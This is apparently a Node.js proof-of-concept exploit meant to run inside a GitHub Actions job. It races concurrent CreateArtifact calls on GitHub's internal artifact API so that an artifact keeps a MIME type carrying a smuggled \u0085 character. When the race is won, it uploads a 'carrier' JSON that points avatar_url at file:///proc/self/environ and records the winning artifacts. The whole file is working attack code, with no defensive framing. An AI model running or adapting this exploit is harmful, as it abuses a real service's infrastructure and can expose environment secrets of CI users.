import {createHash} from 'node:crypto';
import {writeFileSync} from 'node:fs';
import {BlobClient} from '@azure/storage-blob';
import {internalArtifactTwirpClient} from '../node_modules/@actions/artifact/lib/internal/shared/artifact-twirp-client.js';
import {getBackendIdsFromToken} from '../node_modules/@actions/artifact/lib/internal/shared/util.js';
import {StringValue} from '../node_modules/@actions/artifact/lib/generated/index.js';

const ids = getBackendIdsFromToken();
const client = internalArtifactTwirpClient({maxAttempts: 1});
const odd = '\u0085application/json';
const placeholder = Buffer.from('{"probe":"race"}');
const hash = `sha256:${createHash('sha256').update(placeholder).digest('hex')}`;
const winners = [];

async function create(name, version, mimeType) {
  try {
    const value = await client.CreateArtifact({
      workflowRunBackendId: ids.workflowRunBackendId,
      workflowJobRunBackendId: ids.workflowJobRunBackendId,
      name,
      version,
      mimeType: StringValue.create({value: mimeType}),
    });
    return {ok: true, url: value.signedUploadUrl};
  } catch (error) {
    return {ok: false, error: String(error).slice(0, 180)};
  }
}

async function upload(url, bytes) {
  if (!url) return false;
  await new BlobClient(url).getBlockBlobClient().uploadData(bytes, {
    blobHTTPHeaders: {blobContentType: odd},
  });
  return true;
}

async function finalize(name) {
  try {
    const value = await client.FinalizeArtifact({
      workflowRunBackendId: ids.workflowRunBackendId,
      workflowJobRunBackendId: ids.workflowJobRunBackendId,
      name,
      size: String(placeholder.length),
      hash: StringValue.create({value: hash}),
    });
    return {ok: true, id: String(value.artifactId)};
  } catch (error) {
    return {ok: false, error: String(error).slice(0, 180)};
  }
}

async function inspect(name) {
  try {
    const value = await client.GetSignedArtifactURL({
      workflowRunBackendId: ids.workflowRunBackendId,
      workflowJobRunBackendId: ids.workflowJobRunBackendId,
      name,
    });
    const url = new URL(value.signedUrl);
    return {ok: true, contentType: url.searchParams.get('rsct')};
  } catch (error) {
    return {ok: false, error: String(error).slice(0, 180)};
  }
}

function carrierBytes(repository) {
  return Buffer.from(JSON.stringify({
    full_name: repository,
    owner: {login: 'cassette', avatar_url: 'file:///proc/self/environ'},
    description: 'Repo Cassette concurrent carrier',
    stargazers_count: 0,
  }));
}

async function trial(index) {
  const name = `race-${process.env.GITHUB_RUN_ID}-${index}`;
  // Version 6 accepts the odd MIME while version 7 selects raw delivery. Send
  // both creates together so inconsistent name-based state can retain both.
  const requests = index % 2 === 0
    ? [create(name, 6, odd), create(name, 7, 'application/json')]
    : [create(name, 7, 'application/json'), create(name, 6, odd)];
  const created = await Promise.all(requests);
  await Promise.all(created.map(item => upload(item.url, placeholder).catch(() => false)));
  const final = await finalize(name);
  const view = await inspect(name);
  const isOdd = view.contentType?.includes('\u0085') ?? false;
  const row = {
    index,
    order: index % 2 === 0 ? '6,7' : '7,6',
    creates: created.map(item => item.ok ? {ok: true} : {ok: false, error: item.error}),
    final: final.ok ? {ok: true, id: final.id} : final,
    view: view.ok ? {ok: true, contentType: JSON.stringify(view.contentType).slice(1, -1)} : view,
    isOdd,
  };
  if (isOdd && final.id) {
    const repository = `${process.env.GITHUB_REPOSITORY}/actions/artifacts/${final.id}/zip`;
    const body = carrierBytes(repository);
    const placed = await Promise.all(
      created.map(item => upload(item.url, body).catch(() => false)),
    );
    row.repository = repository;
    row.carrierPlaced = placed.some(Boolean);
    if (row.carrierPlaced) {
      winners.push({id: final.id, name, repository});
    }
  }
  console.log(`RACE ${JSON.stringify(row)}`);
  return row;
}

const rows = [];
for (let start = 0; start < 128; start += 16) {
  rows.push(...await Promise.all(
    Array.from({length: 16}, (_, offset) => trial(start + offset)),
  ));
}
const summary = {
  total: rows.length,
  odd: rows.filter(row => row.isOdd).length,
  finalized: rows.filter(row => row.final?.ok).length,
  bothCreated: rows.filter(row => row.creates.every(item => item.ok)).length,
};
console.log(`RACE_SUMMARY ${JSON.stringify(summary)}`);
writeFileSync('carrier-results.json', JSON.stringify({
  runId: process.env.GITHUB_RUN_ID,
  repository: process.env.GITHUB_REPOSITORY,
  winners,
  summary,
  rows,
}, null, 2) + '\n');
